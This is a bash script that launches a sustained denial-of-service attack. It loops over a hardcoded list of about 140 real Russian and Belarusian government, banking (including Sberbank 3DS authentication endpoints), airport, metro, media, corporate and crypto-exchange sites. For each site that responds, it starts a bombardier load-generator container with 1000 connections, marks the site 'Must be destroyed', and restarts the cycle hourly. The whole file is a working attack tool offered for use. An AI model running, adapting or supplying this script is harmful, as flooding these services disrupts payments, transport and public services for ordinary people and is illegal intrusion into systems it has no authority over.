#!/bin/bash
# Configuration of Bombardier

BOMBARDIER_TIMEOUT=600000s

BOMBARDIER_CONNECTIONS=1000



declare -a sites=(
  "https://rkn.gov.ru"
  "https://president.gov.by"
  "https://crimea-news.com"
  "https://www.kp.ru"
  "https://scr.online.sberbank.ru/api/fl/idgib-w-3ds"
  "https://3dsec.sberbank.ru/mportal3/auth/login"
  "https://fsb.ru"
  "https://acs1.sbrf.ru"
  "https://acs2.sbrf.ru"
  "https://acs3.sbrf.ru"
  "https://acs4.sbrf.ru"
  "https://acs5.sbrf.ru"
  "https://acs6.sbrf.ru"
  "https://acs7.sbrf.ru"
  "https://acs8.sbrf.ru"
  "https://xn--90adear.xn--p1ai"
  "https://xn--b1aew.xn--p1ai/Gorjachaja_linija_MVD_Rossii"
  "https://mail.rkn.gov.ru"
  "http://dosaaf.ru/index.php"
  "https://www.soldat.ru/"
  "https://mail.rkn.gov.ru/"
  "https://cloud.rkn.gov.ru"
  "https://mvd.gov.ru"
  "https://pwd.wto.economy.gov.ru/ "
  "https://stroi.gov.ru/"
  "https://proverki.gov.ru/"
  "https://magnit.ru/"
  "https://www.nornickel.com/"
  "https://www.surgutneftegas.ru/"
  "https://nlmk.com/"
  "https://www.sibur.ru/"
  "https://www.severstal.com/"
  "https://www.metalloinvest.com/"
  "https://nangs.org/"
  "https://rmk-group.ru/ru/"
  "https://www.tmk-group.ru/"
  "https://www.polymetalinternational.com/ru/"
  "https://www.uralkali.com/ru/"
  "https://www.eurosib.ru/"
  "https://ugmk.ua/"
  "https://omk.ru/"
  "https://www.sberbank.ru"
  "https://www.gazprombank.ru/"
  "https://www.gosuslugi.ru/"
  "https://www.mos.ru/uslugi/"
  "https://kremlin.ru/"
  "https://government.ru/"
  "https://mil.ru/"
  "https://www.nalog.gov.ru/"
  "https://customs.gov.ru/"
  "https://pfr.gov.ru/"
  "https://rkn.gov.ru/"
  "https://109.207.1.97/"
  "https://109.207.1.118/"
  "https://lenta.ru/"
  "https://ria.ru/"
  "https://ria.ru/lenta/"
  "https://www.rbc.ru/"
  "https://smotrim.ru/"
  "https://tass.ru/"
  "https://tvzvezda.ru/"
  "https://rbc.ru/"
  "https://api.developer.sber.ru/"
  "https://api.sberbank.ru/"
  "https://gazeta.ru/"
  "https://kp.ru/"
  "https://riafan.ru/"
  "https://pikabu.ru/"
  "https://kommersant.ru/"
  "https://mk.ru/"
  "https://yaplakal.ru/"
  "https://bezformata.com/"
  "https://mosmetro.ru/"
  "https://www.metro.spb.ru/"
  "https://transport.mos.ru/"
  "https://parking.mos.ru/"
  "https://www.dme.ru"
  "https://www.svo.aero"
  "https://www.bestchange.ru"
  "https://www.moex.com"
  "http://fss.gov.ru"
  "https://www.finambank.ru"
  "https://www.finam.ru"
  "https://mosfund.ru"
  "https://www.minfinchr.ru"
  "https://minfin.gov.ru"
  "https://roskazna.gov.ru"
  "https://www.vedomosti.ru"
  "https://vsesmi.online"
  "https://www.rossiya-airlines.com"
  "http://www.gov.ru"
  "https://pulkovoairport.ru"
  "https://www.tutu.ru"
  "https://vvo.aero"
  "https://www.vnukovo.ru"
  "https://www.vl.ru"
  "https://aer.aero"
  "https://cleanbtc.ru"
  "https://bonkypay.com"
  "https://changer.club"
  "https://superchange.net"
  "https://mine.exchange"
  "https://platov.co"
  "https://ww-pay.net"
  "https://delets.cash"
  "https://betatransfer.org"
  "https://ramon.money"
  "https://coinpaymaster.com"
  "https://bitokk.biz"
  "https://cashbank.pro"
  "https://flashobmen.com"
  "https://ychanger.net"
  "https://multichange.net"
  "https://24paybank.ne"
  "https://royal.cash"
  "https://prostocash.com"
  "https://baksman.org"
  "https://kupibit.me"
  "https://abcobmen.com"
  "https://cleanbtc.ru"
  "https://bonkypay.com"
  "https://changer.club"
  "https://superchange.net"
  "https://platov.co"
  "https://delets.cash"
  "https://betatransfer.org"
  "https://coinpaymaster.com"
  "https://bitokk.biz"
  "https://www.netex24.net"
  "https://flashobmen.com"
  "https://abcobmen.com"
  "https://ychanger.net"
  "https://multichange.net"
  "https://24paybank.ne"
  "https://royal.cash"
  "https://prostocash.com"
  "https://baksman.org"
  "https://kupibit.me"
  "https://abcobmen.com"
)

while :
do
  echo "Stop all containers"

  docker stop $(docker ps -aq)

  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}\n" "$site")
  
    status_code=$(expr "$status_code" + 0)
  
  
  
    # If status code is zero site is already blocked
  
  
  
    site_status="${site} status code ${status_code}"
  
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
  
      echo "Must be destroyed"

      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
  
    fi
  
  done

  echo "DDoS is up and running..."

  sleep 1h

  echo "Restarting DDoS, checking which sites are still working"
done